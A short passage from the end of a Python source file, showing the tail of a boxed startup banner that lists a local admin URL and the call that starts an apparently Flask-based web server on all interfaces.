║   Admin:  http://localhost:{port}/admin                             ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
""")
    app.run(host='0.0.0.0', port=port, debug=False)
